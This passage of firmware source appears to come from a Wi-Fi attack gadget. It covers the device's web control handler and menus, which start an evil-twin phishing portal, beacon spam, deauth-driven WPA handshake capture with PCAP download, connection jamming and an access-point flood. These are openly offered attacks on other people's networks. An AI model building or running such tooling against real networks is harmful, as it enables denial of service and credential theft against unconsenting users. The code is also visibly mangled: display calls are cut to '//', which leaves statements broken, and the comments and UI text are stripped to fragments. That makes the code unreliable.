    const int scrollDelay = 150; // ms
    if (textW <= //width() - 2) {
      int x = (//width() - textW) / 2; if (x < 0) x = 0;
      //.setCursor(x, y);
      //.print(pwdLine);
      pwdScrollX = 0;
    } else {
      if (millis() - pwdLastScrollMs > (unsigned)scrollDelay) {
        pwdScrollX = (pwdScrollX + 2) % (textW + 16);
        pwdLastScrollMs = millis();
      }
      int startX = pwdScrollX;
      //.setCursor(2 - startX, y);
      //.print(pwdLine);
      //.setCursor(2 - startX + textW + 16, y);
      //.print(pwdLine);
    }
  }
  {
    const char* b = "BACKExit";
    int wb = //.getUTF8Width(b);
    int xb = (//width() - wb) / 2; if (xb < 0) xb = 0;
    //.setCursor(xb, 55);
    //.print(b);
  }

  ////);
}
// WebRequest
void handleWebClient(WiFiClient& client) {
  String request = "";
  unsigned long timeout = millis() + 2000; // 2Timeout

  // HTTPRequest
  while (client.connected() && millis() < timeout) {
    if (client.available()) {
      char c = client.read();
      request += c;
      if (request.endsWith("\r\n\r\n")) {
        break;
      }
    }
    delay(1);
  }

  // RequestEmptyTimeout，Back
  if (request.length() == 0) {
    Serial.println("[WebClient] Empty request or timeout");
    return;
  }

  // RequestPath
  String method = "GET";
  String path = "/";
  int firstSpace = request.indexOf(' ');
  int secondSpace = request.indexOf(' ', firstSpace + 1);
  if (firstSpace > 0 && secondSpace > firstSpace) {
    method = request.substring(0, firstSpace);
    path = request.substring(firstSpace + 1, secondSpace);
  }

  // YesPOSTRequest，Request
  if (method == "POST") {
    // Content-Length
    int contentLengthPos = request.indexOf("Content-Length: ");
    if (contentLengthPos >= 0) {
      int contentLengthEnd = request.indexOf("\r\n", contentLengthPos);
      if (contentLengthEnd > contentLengthPos) {
        String contentLengthStr = request.substring(contentLengthPos + 16, contentLengthEnd);
        int contentLength = contentLengthStr.toInt();

        // Request
        if (contentLength > 0 && contentLength < 1024) { // RequestSize
          String body = "";
          unsigned long bodyTimeout = millis() + 1000; // 1Timeout
          while (client.available() < contentLength && millis() < bodyTimeout) {
            delay(1);
          }

          for (int i = 0; i < contentLength && client.available(); i++) {
            body += (char)client.read();
          }

          // RequestRequestMedium
          request += body;
        }
      }
    }
  }

  // Captive Portal: Detect，Back204
  if (path == "/generate_204" || path == "/gen_204" || path == "/ncsi.txt" || path == "/hotspot-detect.html" || path.startsWith("/connecttest.txt") || path.startsWith("/library/test/success.html") || path.startsWith("/success.txt")) {
    String body = "<html><head><meta http-equiv=\"refresh\" content=\"0; url=/\"></head><body></body></html>";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: text/html\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Content-Length: " + String(body.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(body);
  }
  // RequestPath（Beacon）
  else if (path == "/" || path == "/index.html") {
    // YesPacketMode，PacketDownload，NoWeb UI
    if (quick_capture_completed) {
      sendQuickCapturePage(client);
    } else {
      sendWebPage(client);
    }
  } else if (method == "POST" && path == "/custom-beacon") {
    // POSTMediumssidband（x-www-form-urlencodedJSON）
    String body = "";
    int bodyStartPos = request.indexOf("\r\n\r\n");
    if (bodyStartPos >= 0) {
      body = request.substring(bodyStartPos + 4);
    }

    // ssid
    String ssid = "";
    // urlencoded: ssid=...
    int ssidPos = body.indexOf("ssid=");
    if (ssidPos >= 0) {
      int end = body.indexOf('&', ssidPos);
      if (end < 0) end = body.length();
      ssid = urlDecode(body.substring(ssidPos + 5, end));
    }
    // JSON: "ssid":"..."
    if (ssid.length() == 0) {
      int j1 = body.indexOf("\"ssid\":\"");
      if (j1 >= 0) {
        int j2 = body.indexOf('"', j1 + 8);
        if (j2 > j1) ssid = body.substring(j1 + 8, j2);
      }
    }

    // band
    String band = "mixed";
    int bandPos = body.indexOf("band=");
    if (bandPos >= 0) {
      int end = body.indexOf('&', bandPos);
      if (end < 0) end = body.length();
      band = urlDecode(body.substring(bandPos + 5, end));
    }
    if (band.length() == 0) {
      int k1 = body.indexOf("\"band\":\"");
      if (k1 >= 0) {
        int k2 = body.indexOf('"', k1 + 9);
        if (k2 > k1) band = body.substring(k1 + 9, k2);
      }
    }

    // Width：
    ssid.replace("%20", " ");

    // SettingsMode：0=,1=5G,2=2.4G
    if (band == "mixed") {
      beaconBandMode = 0;
    } else if (band == "5g" || band == "5G") {
      beaconBandMode = 1;
    } else {
      beaconBandMode = 2;
    }

    // StartBeaconAttack
    if (ssid.length() > 0) {
      startCustomBeaconFromWeb(ssid);
      String resp = "{\"success\":true,\"message\":\"custom beacon started\"}";
      String hdr = "HTTP/1.1 200 OK\r\n";
      hdr += "Content-Type: application/json\r\n";
      hdr += "Content-Length: " + String(resp.length()) + "\r\n";
      hdr += "Connection: close\r\n\r\n";
      client.print(hdr);
      client.print(resp);
    } else {
      String resp = "{\"success\":false,\"message\":\"ssid required\"}";
      String hdr = "HTTP/1.1 400 Bad Request\r\n";
      hdr += "Content-Type: application/json\r\n";
      hdr += "Content-Length: " + String(resp.length()) + "\r\n";
      hdr += "Connection: close\r\n\r\n";
      client.print(hdr);
      client.print(resp);
    }
  } else if (path == "/status") {
    handleStatusRequest(client);
  } else if (path == "/capture") {
    // PacketDoneDownload
    sendQuickCapturePage(client);
  } else if (path == "/capture/download") {
    // DownloadPCAPFile
    sendPcapDownload(client);
  } else if (path == "/capture/status") {
    // PacketStatusAPI
    sendCaptureStatus(client);
  } else if (method == "POST" && path == "/stop") {
    // minimal stop for custom beacon
    beaconAttackRunning = false;
    becaonstate = 0;
    stopAttackLED();
    String resp = "{\"success\":true,\"message\":\"stopped\"}";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/json\r\n";
    hdr += "Content-Length: " + String(resp.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(resp);
  } else if (method == "POST" && path == "/handshake/scan") {
    // Graceful scan: stop AP services, perform scan, restart AP, results kept
    // ：ScanMedium
    if (!g_scanDone) {
      // Stop WebUI AP (clients will disconnect briefly)
      stopDNSServer();
      stopWebServer();
      wifi_off();
      delay(200);
      wifi_on(RTW_MODE_STA);
      delay(200);
    }
    // Start scan async in the background state variables
    scan_results.clear();
    g_scanDone = false;
    // unsigned long startMs = millis(); // UsageVar
    if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
      // Let loop-side status endpoint report progress
    }
    // Stash a marker that a scan is in progress
    hs_sniffer_running = false; // not used; reuse web_ui_active flag
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (path == "/handshake/scan-status") {
    bool done = g_scanDone;
    String json = String("{\"done\":") + (done?"true":"false") + "}";
    String hdr = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: " + String(json.length()) + "\r\nConnection: close\r\n\r\n";
    client.print(hdr);
    client.print(json);
  } else if (path == "/handshake/scan-results") {
    // Restart AP and return results as HTML
    // Restart original AP
    wifi_off();
    delay(200);
    wifi_on(RTW_MODE_AP);
    delay(300);
    {
      char channel_str[4];
      sprintf(channel_str, "%d", WEB_UI_CHANNEL);
      if (!WiFi.apbegin(WEB_UI_SSID, WEB_UI_PASSWORD, channel_str, 0)) {
        // fallback attempt without password semantics
        WiFi.apbegin((char*)WEB_UI_SSID, (char*)WEB_UI_PASSWORD, channel_str, 0);
      }
    }
    // WaitIP
    IPAddress apIp;
    unsigned long t0 = millis();
    do { apIp = WiFi.localIP(); delay(50); } while (apIp[0]==0 && millis()-t0<2000);
    startWebUIServices(apIp);
    String html;
    html.reserve(1024);
    html += "<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th></th><th>Select</th></tr>";
    for (size_t i=0;i<scan_results.size() && i<64;i++){
      const WiFiScanResult &r = scan_results[i];
      html += "<tr><td>" + (r.ssid.length()? r.ssid: String("<Hidden>")) + "</td><td>" + r.bssid_str + "</td><td>" + String(r.channel) + "</td><td>" + String(r.rssi) + "</td><td>";
      html += "<button onclick=\"selectNetwork('" + r.bssid_str + "')\">Select</button>";
      html += "</td></tr>";
    }
    html += "</table>";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: text/html; charset=UTF-8\r\n";
    hdr += "Content-Length: " + String(html.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(html);
  } else if (method == "POST" && path.startsWith("/handshake/select")) {
    // parse bssid from query or body
    String bssidStr = "";
    int qpos = path.indexOf('?');
    if (qpos >= 0 && qpos + 1 < (int)path.length()) {
      String qs = path.substring(qpos + 1);
      int p = qs.indexOf("bssid=");
      if (p >= 0) { bssidStr = qs.substring(p + 6); }
    }
    if (bssidStr.length() == 0) {
      int bodyPos = request.indexOf("\r\n\r\n");
      if (bodyPos >= 0) {
        String body = request.substring(bodyPos + 4);
        int k = body.indexOf("bssid=");
        if (k >= 0) { bssidStr = urlDecode(body.substring(k + 6)); }
      }
    }
    hs_has_selection = false;
    if (bssidStr.length() > 0) {
      for (size_t i=0;i<scan_results.size();i++){
        if (scan_results[i].bssid_str == bssidStr) {
          hs_selected_network = scan_results[i];
          hs_has_selection = true;
          break;
        }
      }
    }
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (method == "POST" && path == "/handshake/capture") {
    // Map selection to handshake globals and start
    if (hs_has_selection) {
      // Parse mode from body (active|passive|efficient)
      String mode = "active";
      int bodyPos = request.indexOf("\r\n\r\n");
      if (bodyPos >= 0) {
        String body = request.substring(bodyPos + 4);
        int m = body.indexOf("mode=");
        if (m >= 0) {
          int amp = body.indexOf('&', m);
          mode = urlDecode(body.substring(m + 5, amp >= 0 ? amp : body.length()));
        }
      }
      // Populate globals expected by handshake.h
      memcpy(_selectedNetwork.bssid, hs_selected_network.bssid, 6);
      _selectedNetwork.ssid = hs_selected_network.ssid;
      _selectedNetwork.ch = hs_selected_network.channel;
      AP_Channel = String(current_channel);
      // Configure capture mode
      if (mode == "passive") {
        g_captureMode = CAPTURE_MODE_PASSIVE;
        g_captureDeauthEnabled = false;
      } else if (mode == "efficient") {
        g_captureMode = CAPTURE_MODE_EFFICIENT;
        g_captureDeauthEnabled = false; // SniffSend
      } else {
        g_captureMode = CAPTURE_MODE_ACTIVE;
        g_captureDeauthEnabled = true;
      }
      Serial.print("[WebUI] Capture mode: "); Serial.println(mode);
      isHandshakeCaptured = false;
      handshakeDataAvailable = false;
      readyToSniff = true;
      hs_sniffer_running = true;
      // StartPacketLED
      startHandshakeLED();
    }
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (method == "POST" && path == "/handshake/stop") {
    readyToSniff = false;
    hs_sniffer_running = false;
    // RestoreWebUI LEDStatus
    if (web_ui_active) {
      startWebUILED();
    }
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (path == "/handshake/status") {
    size_t savedSize = (size_t)globalPcapData.size();
    bool captured = handshakeDataAvailable || (savedSize > 0) || isHandshakeCaptured;
    String json = "{";
    json += "\"running\":" + String(hs_sniffer_running ? "true":"false") + ",";
    json += "\"captured\":" + String(captured ? "true":"false") + ",";
    json += "\"justCaptured\":" + String(handshakeJustCaptured ? "true":"false") + ",";
    json += "\"hsCount\":" + String((unsigned long)lastCaptureHSCount) + ",";
    json += "\"mgmtCount\":" + String((unsigned long)lastCaptureMgmtCount) + ",";
    json += "\"ts\":" + String((unsigned long)lastCaptureTimestamp) +
            ",\"pcapSize\":" + String((unsigned long)savedSize) + "}";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/json\r\n";
    hdr += "Content-Length: " + String(json.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(json);
    //  justCaptured ，
    if (handshakeJustCaptured) handshakeJustCaptured = false;
  } else if (method == "POST" && path == "/handshake/delete") {
    resetGlobalHandshakeData();
    String hdr = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n";
    client.print(hdr);
  } else if (path == "/handshake/options") {
    // Return <option> list for dropdown
    String html;
    html.reserve(2048);
    for (size_t i=0;i<scan_results.size() && i<128;i++) {
      const WiFiScanResult &r = scan_results[i];
      String label = (r.ssid.length()? r.ssid: String("<Hidden>"));
      label += String(" | ") + r.bssid_str + String(" | CH") + String(r.channel) + String(" | RSSI ") + String(r.rssi);
      html += String("<option value=\"") + r.bssid_str + String("\">") + label + String("</option>");
    }
    String hdr = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: " + String(html.length()) + "\r\nConnection: close\r\n\r\n";
    client.print(hdr);
    client.print(html);
  } else if (path == "/handshake/download") {
    // Return PCAP data
    const std::vector<uint8_t> &buf = (globalPcapData.size() > 0) ? globalPcapData : globalPcapData;
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/octet-stream\r\n";
    hdr += "Content-Disposition: attachment; filename=\"capture.pcap\"\r\n";
    hdr += "Content-Length: " + String((unsigned long)buf.size()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    if (!buf.empty()) { client.write(buf.data(), buf.size()); }
  } else {
    // Path：
    String hdr = "HTTP/1.1 302 Found\r\n";
    hdr += "Location: /\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
  }

  client.stop();
}

// SendWeb
void sendWebPage(WiFiClient& client) {
  size_t pageLen = strlen_P(WEB_ADMIN_HTML);
  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: text/html; charset=UTF-8\r\n";
  header += "Cache-Control: public, max-age=300\r\n";
  header += "Content-Length: " + String(pageLen) + "\r\n";
  header += "Connection: close\r\n\r\n";
  client.print(header);
  // WebUIManage
  client.print(F(WEB_ADMIN_HTML));
}


// StatusRequest
void handleStatusRequest(WiFiClient& client) {
  String json = "{";
  bool apRunning = web_ui_active || web_test_active;
  json += "\"ap_running\":" + String(apRunning ? "true" : "false") + ",";
  json += "\"connected_clients\":" + String(web_client.connected() ? 1 : 0) + ",";
  json += "\"ssid\":\"" + String(web_test_active ? web_test_ssid_dynamic : WEB_UI_SSID) + "\",";
  json += "\"deauth_running\":" + String(deauthAttackRunning ? "true" : "false") + ",";
  json += "\"beacon_running\":" + String(beaconAttackRunning ? "true" : "false");
  json += "}";

  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: application/json\r\n";
  header += "Content-Length: " + String(json.length()) + "\r\n";
  header += "Connection: close\r\n\r\n";

  client.print(header);
  client.print(json);
}



// Send404Response
/* removed: legacy WebUI 404 */
void send404Response(WiFiClient& client) {
  String header = "HTTP/1.1 404 Not Found\r\n";
  header += "Content-Type: text/plain\r\n";
  header += "Connection: close\r\n\r\n";

  client.print(header);
  client.print("404 Not Found");
}


// ============ Web UI AttackExecFunc ============
// FuncAttack，OLEDMenuMediumAttackCode

// BeaconParam（Web UI）
static String g_customBeaconSSID;
static bool g_customBeaconStable = false; // /Param

void startCustomBeaconFromWeb(const String& ssid) {
  beaconAttackRunning = true;
  g_customBeaconSSID = ssid;
  // UsageModeParam
  g_customBeaconStable = false;
  // SettingsBeaconAttackStatusCode4
  becaonstate = 4;
  startAttackLED();
  Serial.println("=== Web UI: StartSSIDBeaconAttack ===");
  Serial.println("SSID: " + g_customBeaconSSID);
}

void executeCustomBeaconFromWeb() {
  static unsigned long lastRun = 0;
  static unsigned long lastBlinkTime = 0;
  static bool redState = false;
  const unsigned long runInterval = 5; // Send
  const unsigned long blinkInterval = 600;

  unsigned long now = millis();
  if (now - lastBlinkTime >= blinkInterval) {
    redState = !redState;
    digitalWrite(LED_R, redState ? HIGH : LOW);
    lastBlinkTime = now;
  }

  if (!beaconAttackRunning) return;
  if (g_customBeaconSSID.length() == 0) return;

  if (now - lastRun < runInterval) return;
  lastRun = now;

  // mixed/5G/2.4G  beaconBandMode ， executeCrossBandBeaconAttackWeb
  // Select"Channel"：/2.4G6Channel；5G36
  int originalChannel = (beaconBandMode == 1) ? 36 : 6;
  executeCrossBandBeaconAttackWeb(g_customBeaconSSID, originalChannel, g_customBeaconStable);
}


// ============ LEDFunc ============

// UpdateLEDStatus
void updateLEDs() {
  unsigned long currentTime = millis();

  // YesNoPacket，YesLED
  extern bool hs_sniffer_running;
  if (hs_sniffer_running) {
    return; // PacketLED，PacketFunc
  }

  // ：
  digitalWrite(LED_B, HIGH);

  // ：WebUIRun
  if (web_ui_active) {
    digitalWrite(LED_G, HIGH);
  } else {
    digitalWrite(LED_G, LOW);
  }

  // ：Attack
  if (deauthAttackRunning || beaconAttackRunning) {
    if (currentTime - lastRedLEDBlink >= RED_LED_BLINK_INTERVAL) {
      redLEDState = !redLEDState;
      digitalWrite(LED_R, redLEDState ? HIGH : LOW);
      lastRedLEDBlink = currentTime;
    }
  } else {
    digitalWrite(LED_R, LOW);
  }
}

// StartAttackLED
void startAttackLED() {
  Serial.println("StartAttack - ");
  digitalWrite(LED_R, HIGH);
  lastRedLEDBlink = millis();
}

// StopAttackLED
void stopAttackLED() {
  Serial.println("StopAttack - Turn Off");
  digitalWrite(LED_R, LOW);
}

// StartWebUI LED
void startWebUILED() {
  Serial.println("StartWebUI - ");
  digitalWrite(LED_G, HIGH);
}

// Turn OffWebUI LED
void closeWebUILED() {
  Serial.println("Turn OffWebUI - Turn Off");
  digitalWrite(LED_G, LOW);
}

// StartPacketLED（LED）
void startHandshakeLED() {
  Serial.println("StartPacket - LED");
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);
  Serial.println("LEDStatusSettings");
}

// PacketDoneLED（）
void completeHandshakeLED() {
  Serial.println("PacketDone - ");
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, HIGH);
  digitalWrite(LED_B, LOW);
  Serial.println("LEDStatusSettings");
}
// ============ AttackStatusFunc ============

// AttackStatus，PacketCenter"AttackMedium"WiFiIcon
void showAttackStatusPage(const char* attackType) {
  static unsigned long lastBlinkTime = 0;
  static bool wifiVisible = true;
  static int blinkCount = 0;
  static bool inBlinkCycle = false;
  const unsigned long BLINK_INTERVAL = 3000; // 3
  const unsigned long BLINK_DURATION = 150; // 150ms

  unsigned long currentTime = millis();

  // WiFiIcon3
  if (!inBlinkCycle && (currentTime - lastBlinkTime >= BLINK_INTERVAL)) {
    // Start
    inBlinkCycle = true;
    blinkCount = 0;
    wifiVisible = false; // Start，Hidden
    lastBlinkTime = currentTime;
  }

  if (inBlinkCycle) {
    // Medium，150ms
    if (currentTime - lastBlinkTime >= BLINK_DURATION) {
      wifiVisible = !wifiVisible;
      lastBlinkTime = currentTime;

      if (!wifiVisible) {
        blinkCount++;
        if (blinkCount >= 3) {
          // Done，End
          inBlinkCycle = false;
          wifiVisible = true; // RestoreStatus
          lastBlinkTime = currentTime; // Wait
        }
      }
    }
  }

  //clearDisplay();
  //setTextColor(SSD1306_WHITE);
  //setTextSize(1);

  // CenterAttackType
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);

  // WidthCenter
  int textWidth = //.getUTF8Width(attackType);
  int textX = (//width() - textWidth) / 2;
  int textY = 25; //

  //.setCursor(textX, textY);
  //.print(attackType);

  // WiFiIcon（Center）
  if (wifiVisible) {
    int wifiX = (//width() - 19) / 2; // WiFiIconWidth19
    int wifiY = 42; // Icon
    //drawBitmap(wifiX, wifiY, image_wifi_not_connected__copy__bits, 19, 16, WHITE);
  }

  ////);
}

// ============ APFloodAttackDesc ============

// APFloodAttackDesc
bool showApFloodInfoPage() {
  // Var
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;

  while (true) {
    unsigned long currentTime = millis();

    // Back
    if (digitalRead(BTN_BACK) == LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      // Wait
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      delay(200); // Time
      return false; // Back
    }

    // Confirm
    if (digitalRead(BTN_OK) == LOW) {
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      // Wait
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      delay(200); // Time
      return true; // ResumeExecAPFloodAttack
    }

    // Desc
    //clearDisplay();
    //setTextSize(1);

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    // Desc（Center）
    const char* line1 = "";
    const char* line2 = "wifiDevice";
    const char* line3 = "Invalid";

    int w1 = //.getUTF8Width(line1);
    int w2 = //.getUTF8Width(line2);
    int w3 = //.getUTF8Width(line3);

    int x1 = (//width() - w1) / 2;
    int x2 = (//width() - w2) / 2;
    int x3 = (//width() - w3) / 2;

    //.setCursor(x1, 15);
    //.print(line1);
    //.setCursor(x2, 30);
    //.print(line2);
    //.setCursor(x3, 45);
    //.print(line3);

    // Button
    //.setCursor(5, 60);
    //.print("《 Back");
    //.setCursor(85, 60);
    //.print("Resume 》");

    ////);

    delay(10); // ShortCPUUsedHeight
  }
}

// ============ ConnectJamDesc ============

// ConnectJamDesc
bool showLinkJammerInfoPage() {
  // Var
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;

  while (true) {
    unsigned long currentTime = millis();

    // Back
    if (digitalRead(BTN_BACK) == LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      // Wait
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      delay(200); // Time
      return false; // Back
    }

    // Confirm
    if (digitalRead(BTN_OK) == LOW) {
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      // Wait
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      delay(200); // Time
      return true; // ResumeExecConnectJam
    }

    // Desc
    //clearDisplay();
    //setTextSize(1);

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    // Desc（Center）
    const char* line1 = "JamConnect，";
    const char* line2 = "WPA/2/3";
    const char* line3 = "TargetDevice";

    // WidthCenter
    int w1 = //.getUTF8Width(line1);
    int w2 = //.getUTF8Width(line2);
    int w3 = //.getUTF8Width(line3);

    int x1 = (//width() - w1) / 2;
    int x2 = (//width() - w2) / 2;
    int x3 = (//width() - w3) / 2;

    //.setCursor(x1, 15);
    //.print(line1);
    //.setCursor(x2, 30);
    //.print(line2);
    //.setCursor(x3, 45);
    //.print(line3);

    // Button
    //.setCursor(5, 60);
    //.print("《 Back");
    //.setCursor(85, 60);
    //.print("Resume 》");

    ////);

    delay(10); // ShortCPUUsedHeight
  }
}

// BeaconBroadcastDesc
bool showBeaconTamperInfoPage() {
  // Var
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;

  while (true) {
    unsigned long currentTime = millis();

    // Back
    if (digitalRead(BTN_BACK) == LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      // Wait
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      delay(200); // Time
      return false; // Back
    }

    // Confirm
    if (digitalRead(BTN_OK) == LOW) {
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      // Wait
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      delay(200); // Time
      return true; // ResumeExecBeacon
    }

    // Desc
    //clearDisplay();
    //setTextSize(1);

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    // Desc（Center）
    const char* line1 = "TargetAP";
    const char* line2 = "SendBeaconFrameData";
    const char* line3 = "";

    // WidthCenter
    int w1 = //.getUTF8Width(line1);
    int w2 = //.getUTF8Width(line2);
    int w3 = //.getUTF8Width(line3);

    int x1 = (//width() - w1) / 2;
    int x2 = (//width() - w2) / 2;
    int x3 = (//width() - w3) / 2;

    //.setCursor(x1, 15);
    //.print(line1);
    //.setCursor(x2, 30);
    //.print(line2);
    //.setCursor(x3, 45);
    //.print(line3);

    // Button
    //.setCursor(5, 60);
    //.print("《 Back");
    //.setCursor(85, 60);
    //.print("Resume 》");

    ////);

    delay(10); // ShortCPUUsedHeight
  }
}

// BroadcastWarning
bool showBeaconTamperWarningPage() {
  // Var
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;

  while (true) {
    unsigned long currentTime = millis();

    // Back
    if (digitalRead(BTN_BACK) == LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      // Wait
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      delay(200); // Time
      return false; // Back
    }

    // Confirm
    if (digitalRead(BTN_OK) == LOW) {
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      // Wait
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      delay(200); // Time
      return true; // ResumeExecBroadcast
    }

    // Warning
    //clearDisplay();
    //setTextSize(1);

    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    // Warning（Center）
    const char* line1 = "";
    const char* line2 = "DeviceAbnormal";
    const char* line3 = "Usage！";

    // WidthCenter
    int w1 = //.getUTF8Width(line1);
    int w2 = //.getUTF8Width(line2);
    int w3 = //.getUTF8Width(line3);

    int x1 = (//width() - w1) / 2;
    int x2 = (//width() - w2) / 2;
    int x3 = (//width() - w3) / 2;

    //.setCursor(x1, 15);
    //.print(line1);
    //.setCursor(x2, 30);
    //.print(line2);
    //.setCursor(x3, 45);
    //.print(line3);

    // Button
    //.setCursor(5, 60);
    //.print("《 Back");
    //.setCursor(85, 60);
    //.print("Resume 》");

    ////);

    delay(10); // ShortCPUUsedHeight
  }
}

// ============ MenuFunc ============
// Menu ItemFunc

void homeActionSelectSSID() {
  drawssid();
}

void homeActionAttackMenu() {
  drawattack();
}

void homeActionQuickScan() {
  // Status，ConfirmSpam
  stabilizeButtonState();
  if (showConfirmModal("ScanAP/SSID")) {
    drawscan();
  }
}

void homeActionPhishing() {
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSIDSelect
    }
  } else if (g_webTestLocked || g_webUILocked) {
    //clearDisplay();
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);
    //.setCursor(5, 20);
    //.print("");
    //.setCursor(5, 40);
    //.print("RestartDeviceRun");
    //.setCursor(5, 60);
    //.print("《 BackMain Menu");
    ////);
    while (digitalRead(BTN_BACK) != LOW) { delay(10); }
    while (digitalRead(BTN_BACK) == LOW) { delay(10); }
  } else {
    if (apWebPageSelectionMenu()) {
      // Status，ConfirmSpam
      stabilizeButtonState();

      bool confirmed = showConfirmModal("StartPhishingMode");
      if (confirmed) {
        //clearDisplay();
        //.setFontMode(1);
        //.setForegroundColor(SSD1306_WHITE);
        const char* msg = "Start...";
        int w = //.getUTF8Width(msg);
        int x = (//width() - w) / 2;
        //.setCursor(x, 32);
        //.print(msg);
        ////);
        if (!startWebTest()) {
          showModalMessage("StartFailed，Retry");
        }
      }
    }
  }
}

void homeActionConnInterfere() {
  // ConnectJam
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSIDSelect
    }
    return;
  }
  // ConnectJamDesc
  if (showLinkJammerInfoPage()) {
    stabilizeButtonState();
    // TargetConfirmSpam
    if (SelectedVector.size() > 1) {
      if (showConfirmModal("SelectTarget", "《 Back", "Resume 》")) {
        LinkJammer();
      }
    } else {
      if (showConfirmModal("StartConnectJam")) {
        LinkJammer();
      }
    }
  }
}

void homeActionBeaconTamper() {
  // Broadcast
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSIDSelect
    }
    return;
  }
  // BroadcastDesc
  if (showBeaconTamperInfoPage()) {
    // Warning
    if (showBeaconTamperWarningPage()) {
      stabilizeButtonState();
      // TargetConfirmSpam
      if (SelectedVector.size() > 3) {
        if (showConfirmModal("Target", "《 Back", "Resume 》")) {
          BeaconTamper();
        }
      } else {
        if (showConfirmModal("StartBroadcast")) {
          BeaconTamper();
        }
      }
    }
  }
}

void homeActionApFlood() {
  // RequestSend（Certify/Request / APFloodAttack）
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSIDSelect
    }
    return;
  }
  // APFloodAttackDesc；ConfirmResume，BackMain Menu
  if (showApFloodInfoPage()) {
    // Status，ConfirmSpam
    stabilizeButtonState();
    // TargetConfirmSpam
    if (SelectedVector.size() > 1) {
      if (showConfirmModal("SelectTarget", "《 Back", "Resume 》")) {
        RequestFlood();
      }
    } else {
      if (showConfirmModal("StartDosAttack")) {
        RequestFlood();
      }
    }
  }
}

void homeActionAttackDetect() {
  // AttackDetect
  // Status，ConfirmSpam
  stabilizeButtonState();
  if (showConfirmModal("StartAttackFrameDetect")) {
    drawAttackDetectPage();
  }
}

void homeActionPacketMonitor() {
  // Packet
  // Status，ConfirmSpam
  stabilizeButtonState();
  if (showConfirmModal("StartPacket")) {
    drawPacketDetectPage();
  }
}

void homeActionDeepScan() {
  // Status，ConfirmSpam
  stabilizeButtonState();
  if (showConfirmModal("StartScan")) {
    drawDeepScan();
  }
}

void homeActionWebUI() {
  // Status，ConfirmSpam
  stabilizeButtonState();
  if (showConfirmModal("StartWeb UI")) {
    startWebUI();
  }
}

void homeActionQuickCapture() {
  if (SelectedVector.empty()) {
    if (showSelectSSIDConfirmModal()) {
      drawssid(); // AP/SSIDSelect
    }
    return;
  }

  // PacketModeSelect
  drawQuickCaptureModeSelection();
}

// PacketModeSelect
void drawQuickCaptureModeSelection() {
  int modeState = 0; // 0=, 1=, 2=Height
  const char* modeNames[] = {"Mode", "Mode", "HeightMode"};

  while (true) {
    //clearDisplay();
    //.setFontMode(1);
    //.setForegroundColor(SSD1306_WHITE);

    // Title - Center
    const char* title = "PacketModeSelect";
    int titleWidth = //.getUTF8Width(title);
